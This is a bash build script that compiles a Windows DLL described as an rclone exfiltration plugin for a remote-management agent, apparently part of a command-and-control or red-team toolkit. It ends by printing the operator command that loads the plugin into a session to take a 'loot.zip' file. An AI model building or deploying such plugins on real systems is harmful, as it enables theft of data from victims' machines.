#!/usr/bin/env bash
# Build the in-process rclone exfil plugin for the Minimal-RMM Go agent.
#
# Windows amd64 requires the mingw-w64 cross compiler:
#   brew install mingw-w64        (macOS)
#   sudo apt install gcc-mingw-w64-x86-64   (Debian/Ubuntu)
#
# Usage: ./build.sh [output-name.dll]
# The name is free to choose; the agent loads whatever file the operator
# drops into the server plugin directory (RMM_logs/plugins by default).
set -euo pipefail
cd "$(dirname "$0")"

NAME="${1:-rclone-exfil.dll}"
if [[ "$NAME" != *.dll ]]; then
  NAME="${NAME}.dll"
fi

if ! command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
  echo "error: x86_64-w64-mingw32-gcc not found (install mingw-w64)" >&2
  exit 1
fi

echo "Building $NAME (this compiles every rclone backend; the first build takes a while)"
CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc \
  go build -trimpath -ldflags="-s -w" -buildmode=c-shared -o "$NAME" .
echo "Done. Copy $NAME into the server plugin directory, then queue:"
echo "  pe load ${NAME%.dll} --session <id> '{\"source\":\"C:\\\\labs\\\\loot.zip\",...}'"
